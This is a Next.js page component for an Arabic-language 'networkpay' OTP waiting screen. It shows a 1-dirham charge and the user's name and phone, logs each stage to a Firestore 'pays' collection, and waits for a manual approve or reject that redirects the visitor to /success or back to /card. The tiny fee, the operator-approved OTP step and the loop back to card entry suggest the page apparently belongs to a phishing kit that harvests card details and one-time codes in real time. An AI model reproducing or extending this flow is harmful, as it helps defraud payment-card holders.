"use client";
import { useState, useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import StepBar from "@/components/StepBar";
import { db } from "@/lib/firebase";
import {
  onSnapshot, doc,
} from "firebase/firestore";
import { useFormData } from "@/context/FormContext";
import {
  ensureApplicationDoc,
  generateConfirmationCode,
  hasRequiredApplicantData,
  updateApplicationData,
} from "@/lib/application-sync";

export default function OtpPage() {
  const router = useRouter();
  const { data, docId, setDocId, confirmationCode, setConfirmationCode, hydrated } =
    useFormData();

  const [saved, setSaved] = useState(false);
  const [dots, setDots]   = useState(0);

  const docIdRef = useRef<string | null>(null);
  const confCode = useRef(confirmationCode || generateConfirmationCode());

  /* ── Ensure application exists and sync OTP stage ── */
  useEffect(() => {
    if (!hydrated) return;

    if (!hasRequiredApplicantData(data)) {
      router.replace("/register");
      return;
    }

    if (!confirmationCode) {
      setConfirmationCode(confCode.current);
    }

    void ensureApplicationDoc({
      docId,
      data,
      confirmationCode: confCode.current,
      pathname: "/otp",
      extra: {
        status: "pending_review",
        otpStatus: "pending",
      },
    })
      .then(async (resolvedId) => {
        docIdRef.current = resolvedId;
        setDocId(resolvedId);
        await updateApplicationData(resolvedId, {
          status: "pending_review",
          otpStatus: "pending",
          currentStep: "_t2",
          currentPage: "otp",
          isUnread: true,
        });
        setSaved(true);
      })
      .catch((error) => {
        console.error("Failed to sync OTP stage:", error);
        setSaved(true);
      });
  }, [
    confirmationCode,
    data,
    docId,
    hydrated,
    router,
    setConfirmationCode,
    setDocId,
  ]);

  /* ── Listen for admin approval from Firestore ── */
  useEffect(() => {
    if (!saved || !docIdRef.current) return;

    const unsubscribe = onSnapshot(
      doc(db, "pays", docIdRef.current),
      (snap) => {
        const val = snap.data();
        if (val?.status === "approved")  router.push("/success");
        if (val?.status === "rejected")  router.push("/card");
      }
    );
    return () => unsubscribe();
  }, [router, saved]);

  /* ── Animated dots ── */
  useEffect(() => {
    const t = setInterval(() => setDots((d) => (d + 1) % 4), 600);
    return () => clearInterval(t);
  }, []);

  const dotStr = ".".repeat(dots);

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col" dir="rtl">
      <div className="w-full max-w-md mx-auto bg-[#f0f2f5] min-h-screen sm:shadow-xl">

        <div className="bg-white">
          <StepBar current={4} />
        </div>

        <div className="flex flex-col items-center justify-center min-h-[calc(100vh-80px)] px-6 text-center">

          <div className="relative w-28 h-28 mb-8">
            <svg className="absolute inset-0 animate-spin" viewBox="0 0 100 100" fill="none">
              <circle cx="50" cy="50" r="44" stroke="#e5e7eb" strokeWidth="8" />
              <circle cx="50" cy="50" r="44" stroke="#1a2b50" strokeWidth="8"
                strokeLinecap="round" strokeDasharray="138 138" strokeDashoffset="104" />
            </svg>
            <div className="absolute inset-0 flex items-center justify-center">
              <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2">
                <rect x="3" y="11" width="18" height="11" rx="2"/>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
            </div>
          </div>

          <div className="flex items-center gap-1 mb-6">
            <span className="text-[#1a2b50] font-bold text-2xl tracking-tight">network</span>
            <span className="text-[#e63946] font-bold text-2xl tracking-tight">pay</span>
            <svg width="18" height="18" viewBox="0 0 22 22" fill="none">
              <path d="M5 11l5 5 7-9" stroke="#e63946" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/>
            </svg>
          </div>

          <div className="bg-white rounded-2xl shadow-sm px-7 py-7 w-full max-w-sm mb-6">
            <h2 className="text-[#1a2b50] font-extrabold text-xl mb-2">
              جاري مراجعة الطلب{dotStr}
            </h2>
            <p className="text-gray-500 text-sm leading-relaxed mb-5">
              تم إرسال طلبك بنجاح. يرجى الانتظار بينما يتم مراجعة بياناتك والموافقة على عملية الدفع.
            </p>
            <div className="bg-[#f8f9fb] rounded-xl px-4 py-3 flex items-center gap-3 mb-4">
              <div className="w-2 h-2 rounded-full bg-amber-400 animate-pulse flex-shrink-0" />
              <span className="text-xs text-gray-600 font-medium">في انتظار موافقة الجهة المصدرة</span>
            </div>
            <div className="border-t border-gray-100 pt-4 space-y-2 text-right">
              <div className="flex justify-between text-xs">
                <span className="font-semibold text-gray-700">{data.name || "—"}</span>
                <span className="text-gray-400">الاسم</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="font-semibold text-gray-700" dir="ltr">{data.phone || "—"}</span>
                <span className="text-gray-400">الهاتف</span>
              </div>
              <div className="flex justify-between text-xs">
                <span className="font-semibold text-gray-700">1 درهم</span>
                <span className="text-gray-400">المبلغ</span>
              </div>
            </div>
          </div>

          <p className="text-xs text-gray-400 leading-relaxed max-w-xs">
            لا تغلق هذه الصفحة. ستنتقل تلقائياً عند اكتمال المراجعة.
          </p>

          <div className="flex justify-center gap-3 mt-8">
            {[0, 1, 2].map((i) => (
              <div key={i} className="w-10 h-10 bg-white border border-gray-200 rounded-lg flex items-center justify-center shadow-sm">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1a2b50" strokeWidth="2">
                  <rect x="3" y="6" width="18" height="13" rx="2"/>
                  <path d="M3 10h18"/><path d="M7 15h2M13 15h4"/>
                </svg>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
